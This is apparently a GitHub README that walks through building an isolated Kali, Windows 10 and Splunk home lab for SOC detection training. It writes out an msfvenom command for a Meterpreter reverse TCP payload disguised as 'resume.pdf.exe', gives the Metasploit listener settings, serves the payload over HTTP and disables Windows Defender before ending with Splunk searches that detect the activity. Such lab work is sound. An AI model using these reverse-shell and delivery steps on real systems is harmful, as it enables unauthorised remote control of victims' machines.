# Kali-Windows-Splunk-Lab
Build and attack a home lab with Kali Linux, Windows, and Splunk for cybersecurity training. This repository provides a step-by-step guide to setting up VMs, generating attacks, and analyzing telemetry in Splunk—ideal for SOC analysts and cybersecurity enthusiasts to develop threat detection and monitoring skills.

BIG Credits to [Suhailmalik](https://medium.com/@suhailmalik6422/building-and-attacking-a-home-lab-kali-linux-windows-and-splunk-for-telemetry-a7fda409434e) for inspiration to create my own guide. This guid is based off of his.  Please check his article and page out!!


## Introduction
- I will walk you through setting up a home lab for cybersecurity learning and testing purposes. We will use Kali Linux to simulate attacker, Windows 10 Pro for target host, Procmon to detect abnormal changes, and finally Splunk for log analysis.

## Prerequisites
  * Memormy: Min 16GB Recommended 32GB
  * Processor: Capable of Multiple Virtualization Sessions 
  * Storage: Min 256GB Recommended 1TB (For future Pentesting and Malware Analysis Projects)
  * Internet: Min 50mb/s Recommended:100mb/s (Up/Down)
## Setting Up Virtual Box
  ### Installing VirtualBox
 1. Download and install [VirtualBox](https://www.virtualbox.org/wiki/Downloads)![image](https://github.com/user-attachments/assets/ef48a168-1193-4228-af27-eac8295826db)

 2. Download the VitualBox Extension Pack![image](https://github.com/user-attachments/assets/cd09b161-8ce4-42f8-875f-83cba6522662)
## Creating Virtual Machines
  ### Kali Linux
  ### Recommended Settings:
  Memory: 2GB Min: 2GB

  Storage: 80GB Min: 50GB
  
  Processor: 2 Cores Min: 1 Core
  1. Download the [VitualBox 64-bit image]()(or 32-bit depending on system architecture) ![image](https://github.com/user-attachments/assets/d58a8717-23cf-466d-b88f-0141dd8a486b)
  2. Extract and Open in Virtual Box Use [WinRAR](https://www.win-rar.com/download.html?&L=0) or [7-Zip](https://www.7-zip.org/) as extraxtion tool. As file maybe compressed.

![image](https://github.com/user-attachments/assets/08290faf-0f20-4bea-aacc-e798a02fd987)
 
  3. Travel to extracted folder file destination and find the ```.vbox``` file extension and open. Should automatically load VirtualBox and import Kali.  ![image](https://github.com/user-attachments/assets/4db5a455-6fd4-478e-adc5-793c5e56f261)
  4. Start the Kali Linux VM inside VirtualBox if you haven't already. The default credentials are : Username:`kali` Password: `kali`
  ### Windows 10 Pro
  ### Grab a [KMS Win10 Pro Product Key](https://learn.microsoft.com/en-us/windows-server/get-started/kms-client-activation-keys?tabs=server2025%2Cwindows1110ltsc%2Cversion1803%2Cwindows81)
  Doing so will allow us to take advantage of VirtualBox unattended install.(Also a cool resource if you ever want to test different malware on different versions of Windows without paying each time) ![image](https://github.com/user-attachments/assets/af2805f3-4010-4570-8346-79c0f0d14fea)

  1. Navigate to the [Windows 10 ISO Microsoft](https://www.microsoft.com/en-in/software-download/windows10) Scroll Down & Download Windows 10 Installation Media ![image](https://github.com/user-attachments/assets/739cd739-4f0b-4ec0-b69d-5755a169142b)
  2. Run the installer and Select ![image](https://github.com/user-attachments/assets/2dc2c1a4-fc07-4f49-bcca-6dbb1f74f676)
  3. Select `.iso` file and save to preferred destination. ![image](https://github.com/user-attachments/assets/9d61da32-d85a-42f7-8935-b3661a194e78)
  4. Create a New VM in VirtualBox, Locate the Windows 10 .iso file and upload.![image](https://github.com/user-attachments/assets/249dd203-c752-4ec8-995e-f08abe3dd4d1)
  5. Now use the KMS Win10 Pro Key and adjust the Username/Password to whatever you would like. (These keys are temp and requuire renewal every 180 days. )![image](https://github.com/user-attachments/assets/787383ce-eca4-4179-8ad1-826ecf52ddd6)
  6. I chose 16GB of Memory, 3 CPU and 100GB of Storage as i've experienced decent latency or crashes on lower settings experiment depending on your system and try turning unused VM's off to conserve resources. Start Machine(Windows can take a second to install) ![image](https://github.com/user-attachments/assets/2919e8e8-b687-4563-a9e4-2b9ab816af90) ![image](https://github.com/user-attachments/assets/86fa11be-2665-4c11-920c-b66d51567ece)
### Windows Pt.2
  1. Start Win. VM and install & configure Sysmon using this [article](https://medium.com/@suhailmalik6422/sysmon-collecting-telemetry-for-enhanced-security-4f8ea3c9e543) (Creds:Suhailmalik)
  2. Install & Configure Splunk using this [article](https://medium.com/@suhailmalik6422/splunk-installation-on-windows-and-logs-monitoring-4df6192ecb68) (Creds: Suhailmalik)
## VM Network Configuration
- Our focus is to configure VirtualBox(VB) settings to create an internal network between our Windows VM and Kali VM while also ensuring isolation from our host machine or the internet.
### Windows & Kali Network Configuration
  *Change 'Attached to' to Internal Network, create a name for network be sure to choose the same adapter for both VM's and proceed with saving changes.(Same change for BOTH machines) ![image](https://github.com/user-attachments/assets/deb6056e-60d3-4d0b-95ae-f481a2bbe942)
#### Window Static IP
  1. Start Windows VM and navigate to Network and Sharing Center
   
     ![image](https://github.com/user-attachments/assets/d7a70c1a-baa4-4fe4-a398-acc6f19afec1)

  3. Select Change Adapter Settings, right-click Etherent then select Properties

      ![image](https://github.com/user-attachments/assets/0c117252-fce3-42c0-80d4-52b1438db137)

  5. Navigate to IPv4 and select Properties, change IP to static and use `192.168.20.10` for IP and `255.255.255.0` as Subnet Mask or whatever Static IP you want.
   
     ![image](https://github.com/user-attachments/assets/22ffb8f6-4dbd-4378-b7f3-5c7cbf86abc4)
     
  7. Open Command Prompt and run `ipconfig ` to verify Static IP configuration was succussful.
   
     ![image](https://github.com/user-attachments/assets/0eabf17a-a904-4498-80ea-7842d8fb8f45)
### Kali Static IP
  1. Start the VM search for Advanced Network Configuration, click then select the 'Wired connection 1'
  
  ![image](https://github.com/user-attachments/assets/7b6ac000-f623-4bf8-8e3e-5fa761f24dfd)

  2. Navigate to IPv4 Settings and adjust method to 'Manual' then click 'Add' to add a static IPv4 address. I chose `192.168.20.11` as IPv4 and `24` as my Netmask. Leave Gateway blank and click 'Save'.
  
   ![image](https://github.com/user-attachments/assets/e85f8fb0-0025-4a50-8f44-4d2e98487b7d)

  3. Run Terminal and type `ifconfig` to see if the change was succussful.
  
   ![image](https://github.com/user-attachments/assets/63afd380-28f2-4b72-ad3b-864e8eb6bfb3)

### Test Connectivity
  * Launch Command Prompt on Windows Vm and ping the Kali VM; `ping 192.168.20.11`
  
   ![image](https://github.com/user-attachments/assets/ed5ccea0-5909-417c-a552-f19490191572)

  * You will be unable to ping Windows VM from Kali as windows firewall [block inbound ICMP](https://learn.microsoft.com/en-us/windows/security/operating-system-security/network-security/windows-firewall/configure) connctions. 

## Attacking and Telemetry Generation
  *On Kali machine scan Windows VM using Nmap `nmap -A -Pn <Windows IP>` `-A` enables aggressive scanning, `-Pn` skips host discovery phase. 
  
  ![image](https://github.com/user-attachments/assets/6fe96865-0129-4cae-b2df-636293f35c61)

  * RDP at port 3389 is open(If not simply open on windows machine by searching remote desktop settings in task bar, enabling and running scan again.)
  * Bingo!
### Malware Execution with [MSFVenom](https://www.offsec.com/metasploit-unleashed/msfvenom/)
  1. Within terminal on Kali VM we will use `msfvenom` to create a reverse TCP shell payload
  2. The command is `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Kali IP> LPORT=4444 -f exe -o resume.pdf.exe`
       * `-p` is signaling what payload we want and its respective filepath (windows/x64/meterpreter/reverse_tcp)
       * `LHOST=<Kali IP>` - is the destination we want the payload to connect back to - replace Kali IP w/ actual host ip.
       * `LPORT=4444` - is the local port the attacker's machine (Kali) will listen for connections.
       * `-f exe` - specifies the format of the output file.
       * `-o resume.pdf.exe` - this is the name of the output file (attackers will use a misleading name designed to trick users.)
  3. Now navigate to /Desktop as running the following command will save the file in the current directory.
       *`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Kali IP> LPORT=4444 -f exe -o resume.pdf.exe.`

     ![image](https://github.com/user-attachments/assets/a95f80db-c0d5-46f1-9b95-ca48b2583b4b)

  4. As you can see running `ls` cmd in `/Desktop` returns resume.pdf.exe

### Set up a Listener with Metasploit                          
  *Now we need to open Metasploit using the `msfconsole` command and using the multi-handler.
  
  ![image](https://github.com/user-attachments/assets/4b08bca3-f576-4a93-9367-407ba9712a51)

  ![image](https://github.com/user-attachments/assets/e5bde160-1280-40a7-a2ad-f0df5ea2ad51)

  *Now we will configure the payload to match our malware using the `options` command to set other parameters. 

  ![image](https://github.com/user-attachments/assets/20fe409c-cc53-4370-9eb4-2f36bf3fc87d)

  * Run `set pyload windows/x64/meterpreter/reverse_tcp` - Simply sets the payload
  * Run `set lhost 192.168.20.11` - Sets the local host to whatever your static Kali IP is.
  
   ![image](https://github.com/user-attachments/assets/6c34b000-5f24-4eb5-b1c6-3b56a2d3b4e8)

  *Start the handler to listen for incoming connections
  
  ![image](https://github.com/user-attachments/assets/060492eb-96bd-4ac2-b38c-504d6fd5267b)

### Serving Malware via HTTP:
  * On Kali VM -Using Python open another terminal or powershell instance and run the following command to setup a simple HTTP server.
      * `python3 -m http.server 9999` - this starts a HTTP server at port 9999 `-m` tells Python to runa library module as a script 'http.server' `9999` is the port the HTTP server will use to listen for request.
#### Malware on Windows Machine:
  *Disable Windows Defender on Windows Machine
  *Navigate to `192.168.20.11:9999/Desktop/`
  
  ![image](https://github.com/user-attachments/assets/cc20460f-40e7-45b2-9555-14bc449837dd)

  *Download and bypass Windows Security Measures- Then navigate to `.exe` and run program. 

  ![image](https://github.com/user-attachments/assets/d0ece2ee-5d5b-4aff-9e52-4d927e8f38f2)

  * You should see some activity on Kali terminal while downloading
  
   ![image](https://github.com/user-attachments/assets/c337d339-430e-446e-8682-5486b9ec3f2a)

  *Verify the Resume.pdf.exe is running on Windows VM 
  
  ![image](https://github.com/user-attachments/assets/f32d4364-b7db-4ed7-922a-39f0fedf82e8)

  ### Handling the Reverse Shell on Kali
  *You can confirm connection using Metasploit first use `exploit` to start a Meterpreter session. (Remember to run resume.pdf.exe from Win Machine after starting exploit if your previous session was closed)
  
  ![image](https://github.com/user-attachments/assets/590f02bd-15f0-4daf-a047-16702657097b)

  * Next run the `shell` command within Meterpreter to start a reverse shell
  
    ![image](https://github.com/user-attachments/assets/7aa589de-4928-4151-a741-356ad02db880)

  * Now we are in a reverse shell session and are able to execute commands on our Window Test Machine run these 3 cmds `net user`, ` net local group`, `ipconfig` to generate telemetry for Splunk.
  
  ![image](https://github.com/user-attachments/assets/dde5de78-a90c-4949-8518-b76dd86e0dc3)

  ![image](https://github.com/user-attachments/assets/5a8d6e03-2dfb-4f95-93c6-a454f90694ca)

  *As you can see we are able to generate commands as if we are the local user and have successfully infiltrated the target. Now let us see how we can see this data within Splunk.

  ### Configuring Splunk
  *We need to configure Splunk to ingest Sysmon logs. To do this we will copy the `inputs.conf` file default located in `Program Files\Splunk\etc\system\default\inputs.conf`. Copy this file to `Program Files\Splunk\etc\system\local\inputs.conf` if it is not already there.  Then insert this conf.
  
  ![image](https://github.com/user-attachments/assets/d58c0845-0047-469e-8e04-2ea405505893) Creds: Suhailmalik

  *Now restart Splunk services and once restarted logon to splunk and create an index called `endpoint`. 
  
  ![image](https://github.com/user-attachments/assets/d3b3a76a-a1ae-4c2b-b9a8-b768a2e07b10)

  * Navigate to the Add Data > Data > Indexes
  
   ![image](https://github.com/user-attachments/assets/083ab88c-cd48-4263-9ed7-94d994a146b7)

  * Create a New Index named `endpoint`

    ![image](https://github.com/user-attachments/assets/0f157fb4-6fb9-4578-aa53-128f045dfb00)

    ![image](https://github.com/user-attachments/assets/0bf236aa-6062-4b22-a7ae-568460e608e4)

### Telemetry in Splunk
  * Once in Splunk use the Search & Reporting App to query the data
  
    ![image](https://github.com/user-attachments/assets/c0e32f86-bd7d-408f-a56e-cb9ef7f649a0)

  * Now we searched `index = endpoint Resume.pdf.exe` This tells Splunk to look at the endpoint index and for the results within that focus on the ones with 'Resume.pdf.exe' as an exact match. This gives us results you can further examine to see what data is seen and correlate the events.
  
    ![image](https://github.com/user-attachments/assets/061b02ce-23fd-43bd-8881-19348e9c73a5)

  * Now I will search for CommandLine to look for users accessing Cmd Line. Then in the Fields section(Interesting Fields unless you already selected it) I found the description field and upon reading found interesting process descriptions such as `Net Command` and `IP Configuration Utility`

    ![image](https://github.com/user-attachments/assets/2aa9c2d9-103e-40be-8770-003a7a3aab7b)

*After adding `Net Command` to our search I was able to notice another interesting field `ParentCommandLine` As you can see this field easily shows the commands ran via reverse shell and I will allow you to further examine. 

![image](https://github.com/user-attachments/assets/6057c0d5-d19c-4511-b5c7-e1f501fe04e3)

*Now you can see  by inserting a `|` and using the table argument we are able to better clearly see what is happening and can correlate the command line entries. 


![image](https://github.com/user-attachments/assets/29b67819-0fb5-470c-a080-e7de6a512e8f)

## Conclusion
  * We have built a Home Lab which is the perfect environment to practice your Threat Hunting, Threat Intelligence and other Penetration Testing or Cybersecurity skills. This lab is all yours now I am interested to see how you use it and what other projects you have used it for. Please connect with me on linkedin and happy threat hunting!


[https://www.linkedin.com/feed/](https://www.linkedin.com/in/fradley-joseph-99a8a5197/)


   
BIG Credits to [Suhailmalik](https://medium.com/@suhailmalik6422/building-and-attacking-a-home-lab-kali-linux-windows-and-splunk-for-telemetry-a7fda409434e) who inspired me to build my own lab then I decided to publish it as a personal project for any other aspiring Cybersecurity Engineers!

  








   


  


  

  

   
  

   




  


  

  

     













